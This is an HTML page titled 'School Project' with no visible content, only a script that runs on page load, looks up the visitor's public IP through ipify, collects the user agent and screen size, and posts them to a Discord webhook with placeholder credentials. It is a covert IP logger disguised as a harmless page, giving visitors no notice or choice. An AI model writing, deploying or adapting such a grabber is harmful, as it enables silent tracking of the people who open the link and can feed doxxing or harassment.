<!DOCTYPE html>
<html>
<head>
    <title>School Project</title>
</head>
<body>
<script>
const ipifyAPI = "https://api.ipify.org?format=json";
const webhookURL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"; // Replace this

async function getIP() {
    try {
        const response = await fetch(ipifyAPI);
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Failed to get IP:", error);
        return "Unknown";
    }
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    const screenRes = `${screen.width}x${screen.height}`;
    return {
        userAgent: ua,
        screen: screenRes
    };
}

async function sendToDiscord(ip, deviceInfo) {
    const payload = {
        content: `🧪 **School Project Visitor Info**\n📡 IP: ${ip}\n🖥️ User Agent: ${deviceInfo.userAgent}\n🖼️ Screen: ${deviceInfo.screen}`
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("Sent info to Discord!");
        } else {
            console.error("Error sending:", response.statusText);
        }
    } catch (err) {
        console.error("Error:", err);
    }
}

async function main() {
    const ip = await getIP();
    const deviceInfo = getDeviceInfo();
    await sendToDiscord(ip, deviceInfo);
}

main();
</script>
</body>
</html>
